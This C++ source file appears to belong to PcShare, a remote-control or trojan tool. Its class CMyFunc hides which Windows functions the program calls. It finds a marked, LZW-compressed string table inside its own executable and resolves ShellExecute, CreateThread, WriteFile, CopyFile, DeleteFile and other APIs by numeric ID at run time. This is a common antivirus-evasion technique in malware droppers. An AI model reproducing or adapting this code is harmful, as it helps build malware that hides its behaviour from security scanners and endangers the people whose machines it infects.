#include "stdafx.h"
#include "PcStart.h"
#include "Lzw.h"
#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

CMyFunc::CMyFunc()
{
	hModule_MSVCRT = NULL;
	hModule_Kernel32 = NULL;
	hModule_Shell32 = NULL;
	hModule_User32 = NULL;

	pModuleString = NULL;
	nModuleStringLen = 0;
}

CMyFunc::~CMyFunc()
{
	if(hModule_MSVCRT != NULL)
	{
		FreeLibrary(hModule_MSVCRT);
	}
	if(hModule_Kernel32 != NULL)
	{
		FreeLibrary(hModule_Kernel32);
	}
	if(hModule_Shell32 != NULL)
	{
		FreeLibrary(hModule_Shell32);
	}
	if(hModule_User32 != NULL)
	{
		FreeLibrary(hModule_User32);
	}

	if(pModuleString != NULL)
	{
		delete [] pModuleString;
	}
}

inline int CMyFunc::GetMySprintf(int nValue, char* pOutStr)
{
	for(int i = 4; i >= 0; i--)
	{
		pOutStr[i] = 0x30 + nValue % 10;
		nValue = nValue / 10;
	}
	return i;
}

inline BOOL CMyFunc::DoMyMemCmp(char* pSrc, char* pDes, int len)
{
	for(int i = 0; i < len; i++)
	{
		if(pSrc[i] != pDes[i])
		{
			return FALSE;
		}
	}
	return TRUE;
}

inline void  CMyFunc::DoMyMemCpy(char* pSrc, char* pDes, int len)
{
	for(int i = 0; i < len; i++)
	{
		pSrc[i] = pDes[i];
	}
}

inline void CMyFunc::GetMyString(DWORD nIndex, char* pOutString, char* pInString, DWORD nInStringLen)
{
	//查看
	if(pInString == NULL || nInStringLen == 0 || nIndex < 10001 || nIndex > 19999)
	{
		_asm int 3;
		return;
	}
	
	char m_FindStr[256] = {0};
	m_FindStr[0] = 'P';
	m_FindStr[1] = 'S';
	m_FindStr[2] = '_';
	GetMySprintf(nIndex, m_FindStr + 3);
	m_FindStr[8] = '=';
	
	for(DWORD i = 0; i < nInStringLen; i++)
	{
		if(DoMyMemCmp(&pInString[i], m_FindStr, 9))
		{
			//找到开始
			char* pStart = &pInString[i] + 9;
			for(i = 0; i < nInStringLen - i - 9; i++)
			{
				if(pStart[i] == '\r')
				{
					DoMyMemCpy(pOutString, pStart, i);
					pOutString[i] = 0;
					return;
				}
			}
		}
	}

	_asm int 3;
}

BOOL CMyFunc::LoadMyData(BYTE* pModuel)
{
	if(pModuleString != NULL)
	{
		return TRUE;
	}

#ifdef _DEBUG
	
	char m_ModuleFileName[256] = {0};
	::GetModuleFileName(NULL, m_ModuleFileName, 255);
	::CharLower(m_ModuleFileName);
	char* pFind = ::strstr(m_ModuleFileName, "\\bin\\update\\");
	if(pFind != NULL)
	{
		*pFind = 0;
	}
	else
	{
		return FALSE;
	}
	::strcat(m_ModuleFileName, "\\pcshare\\res\\StringDll.ini");

	HANDLE hFile = ::CreateFile(m_ModuleFileName, GENERIC_READ, FILE_SHARE_READ,NULL,  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	nModuleStringLen = ::GetFileSize(hFile, NULL);
	DWORD nReadLen = 0;
	pModuleString = new char[nModuleStringLen + 1];
	pModuleString[nModuleStringLen] = 0;
	::ReadFile(hFile, pModuleString, nModuleStringLen, &nReadLen, NULL);
	::CloseHandle(hFile);

#else
	// PE头偏移
	DWORD dwPE_Header_OffSet = *(DWORD *)(pModuel + 0x3C);
	
	// 取得 PE 头
	IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pModuel + dwPE_Header_OffSet);

	//取字串资源偏移量
	LPPSSAVEFILEINFO pSaveFileInfo = NULL;
	BYTE* pTmpData = pModuel;
	for(DWORD i = 0; i < pPE_Header->OptionalHeader.SizeOfImage - sizeof(ULONGLONG); i++)
	{
		if(*((ULONGLONG*) &pTmpData[i]) == PS_FIND_FLAG)
		{	
			pSaveFileInfo = (LPPSSAVEFILEINFO) &pTmpData[i];
			break;
		}
	}
	if(pSaveFileInfo == NULL)
	{
		return FALSE;
	}
	
	//开辟字串存储缓冲
	BYTE* pTmpStr = NULL;
	FCLzw lzw;
	lzw.PcUnZip(((BYTE*) pSaveFileInfo) + sizeof(PSSAVEFILEINFO), &pTmpStr, &nModuleStringLen);
	pModuleString = (char*) pTmpStr;

#endif
	

	//开始赋值函数指针
	char m_MyString[512] = {0};

//MSVCRT.dll
	GetMyString(10104, m_MyString, pModuleString, nModuleStringLen);
	hModule_MSVCRT = LoadLibrary(m_MyString);

	//sprintf
	GetMyString(10105, m_MyString, pModuleString, nModuleStringLen);
	sprintf = (Mysprintf) GetProcAddress(hModule_MSVCRT, m_MyString);

	//memcpy
	GetMyString(10107, m_MyString, pModuleString, nModuleStringLen);
	memcpy = (Mymemcpy) GetProcAddress(hModule_MSVCRT, m_MyString);

	//memset
	GetMyString(10103, m_MyString, pModuleString, nModuleStringLen);
	memset = (Mymemset) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strlen
	GetMyString(10100, m_MyString, pModuleString, nModuleStringLen);
	strlen = (Mystrlen) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strcpy
	GetMyString(10101, m_MyString, pModuleString, nModuleStringLen);
	strcpy = (Mystrcpy) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strcmp
	GetMyString(10102, m_MyString, pModuleString, nModuleStringLen);
	strcmp = (Mystrcmp) GetProcAddress(hModule_MSVCRT, m_MyString);

//Kernel32.dll
	GetMyString(10053, m_MyString, pModuleString, nModuleStringLen);
	hModule_Kernel32 = LoadLibrary(m_MyString);

	//Sleep
	GetMyString(10075, m_MyString, pModuleString, nModuleStringLen);
	Sleep = (MySleep) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateThread
	GetMyString(10069, m_MyString, pModuleString, nModuleStringLen);
	CreateThread = (MyCreateThread) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetVersion
	GetMyString(10085, m_MyString, pModuleString, nModuleStringLen);
	GetVersion = (MyGetVersion) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetVersionExA
	GetMyString(10084, m_MyString, pModuleString, nModuleStringLen);
	GetVersionEx = (MyGetVersionExA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetModuleFileNameA
	GetMyString(10083, m_MyString, pModuleString, nModuleStringLen);
	GetModuleFileName = (MyGetModuleFileNameA) GetProcAddress(hModule_Kernel32, m_MyString);

	//MultiByteToWideChar
	GetMyString(10073, m_MyString, pModuleString, nModuleStringLen);
	MultiByteToWideChar = (MyMultiByteToWideChar) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateFileA
	GetMyString(10076, m_MyString, pModuleString, nModuleStringLen);
	CreateFile = (MyCreateFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//WriteFile
	GetMyString(10078, m_MyString, pModuleString, nModuleStringLen);
	WriteFile = (MyWriteFile) GetProcAddress(hModule_Kernel32, m_MyString);

	//CloseHandle
	GetMyString(10082, m_MyString, pModuleString, nModuleStringLen);
	CloseHandle = (MyCloseHandle) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetTempPathA
	GetMyString(10088, m_MyString, pModuleString, nModuleStringLen);
	GetTempPath = (MyGetTempPathA) GetProcAddress(hModule_Kernel32, m_MyString);

	//DeleteFileA
	GetMyString(10077, m_MyString, pModuleString, nModuleStringLen);
	DeleteFile = (MyDeleteFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//CopyFileA
	GetMyString(10080, m_MyString, pModuleString, nModuleStringLen);
	CopyFile = (MyCopyFileA) GetProcAddress(hModule_Kernel32, m_MyString);

//User32.dll
	GetMyString(10037, m_MyString, pModuleString, nModuleStringLen);
	hModule_User32 = LoadLibrary(m_MyString);

	//PostMessageA
	GetMyString(10042, m_MyString, pModuleString, nModuleStringLen);
	PostMessage = (MyPostMessageA) GetProcAddress(hModule_User32, m_MyString);

	//CharLowerA
	GetMyString(10040, m_MyString, pModuleString, nModuleStringLen);
	CharLower = (MyCharLowerA) GetProcAddress(hModule_User32, m_MyString);

//Shell32.dll
	GetMyString(10034, m_MyString, pModuleString, nModuleStringLen);
	hModule_Shell32 = LoadLibrary(m_MyString);

	//ShellExecuteExW
	GetMyString(10035, m_MyString, pModuleString, nModuleStringLen);
	ShellExecuteExW = (MyShellExecuteExW) GetProcAddress(hModule_Shell32, m_MyString);

	//ShellExecuteA
	GetMyString(10036, m_MyString, pModuleString, nModuleStringLen);
	ShellExecute = (MyShellExecuteA) GetProcAddress(hModule_Shell32, m_MyString);

	return TRUE;
}